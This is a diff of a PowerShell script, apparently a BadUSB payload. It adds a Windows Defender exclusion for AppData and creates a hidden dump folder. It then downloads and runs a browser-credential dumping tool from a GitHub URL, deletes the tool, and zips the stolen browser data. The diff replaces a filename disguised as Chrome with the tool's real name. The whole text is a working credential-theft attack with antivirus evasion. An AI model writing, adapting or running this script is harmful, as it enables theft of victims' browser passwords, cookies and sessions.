@@ -4,9 +4,9 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "googlechrome.exe"
+Invoke-WebRequest 'https://github.com/GamehunterKaan/BadUSB-Browser/raw/main/hackbrowser.exe' -OutFile "hb.exe"
 .\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\googlechrome.exe" -Force
+Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
